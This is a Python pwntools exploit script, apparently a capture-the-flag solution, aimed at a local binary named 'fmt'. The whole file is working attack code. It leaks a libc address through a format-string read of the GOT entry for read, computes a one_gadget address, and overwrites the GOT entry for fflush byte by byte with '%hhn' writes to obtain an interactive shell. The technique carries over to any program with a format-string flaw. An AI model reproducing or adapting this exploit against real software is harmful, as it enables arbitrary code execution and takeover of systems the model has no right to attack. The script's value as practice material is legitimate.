from pwn import *
context.log_level = 'debug'
p = process('./fmt')
e = ELF('./fmt')
get_libc_payload = "%7$s".ljust(8, 'a')+p64(e.got['read'])
p.send(get_libc_payload)
read_libc = u64(p.recv(6)+'\x00\x00')
print hex(read_libc)
begin_libc = read_libc-0xF1147
print hex(begin_libc)
one_gadget_libc = begin_libc+0xF02A4
print hex(one_gadget_libc)
a1 = (one_gadget_libc & 0xff0000) >> 16
a2 = (one_gadget_libc & 0xff00) >> 8
a3 = one_gadget_libc & 0xff
print hex(a1)+hex(a2)+hex(a3)
point1 = [2, a1]
point2 = [1, a2]
point3 = [0, a3]


def swap(p1, p2):
    for i in range(2):
        t = p1[i]
        p1[i] = p2[i]
        p2[i] = t


if a1 > a2:
    swap(point1, point2)
if a1 > a3:
    swap(point1, point3)
if a2 > a3:
    swap(point2, point3)
print point1+point2+point3

point2[1] = point2[1]-point1[1]
point3[1] = point3[1]-point2[1]-point1[1]
print point1+point2+point3

write_got_payload = '%'+str(point1[1])+'c'+'%12$hhn'
write_got_payload += '%'+str(point2[1])+'c'+'%13$hhn'
write_got_payload += '%'+str(point3[1])+'c'+'%14$hhn'
write_got_payload = write_got_payload.ljust(48, 'a')
write_got_payload += p64(e.got['fflush']+point1[0])
write_got_payload += p64(e.got['fflush']+point2[0])
write_got_payload += p64(e.got['fflush']+point3[0])

p.send(write_got_payload)
p.interactive()
